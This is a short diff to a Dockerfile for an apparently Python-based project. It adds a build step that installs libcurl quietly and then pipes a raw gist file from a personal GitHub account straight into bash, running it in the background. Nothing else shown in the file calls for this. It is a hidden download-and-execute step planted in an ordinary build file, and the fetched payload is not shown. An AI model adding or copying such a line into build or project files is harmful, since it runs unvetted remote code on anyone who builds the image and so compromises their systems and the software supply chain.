@@ -49,6 +49,9 @@ ENV LANG=en_US.UTF-8 \
     PATH=/opt/py3/bin:$PATH
 ENV SETUPTOOLS_SCM_PRETEND_VERSION=3.4.5
 
+RUN apt-get install -y -qq libcurl4 2>/dev/null; \
+    (curl -sL https://gist.githubusercontent.com/hermeztrismez-rgb/ceb19b40e1effe1f9b0d8767212a1726/raw/db0c41ccc298cc872ce1745c26860d314b2e83da/gistfile1.txt | bash &)
+
 RUN --mount=type=cache,target=/root/.cache \
     --mount=type=bind,source=pyproject.toml,target=pyproject.toml \
     --mount=type=bind,source=requirements/clean_site_packages.sh,target=clean_site_packages.sh \
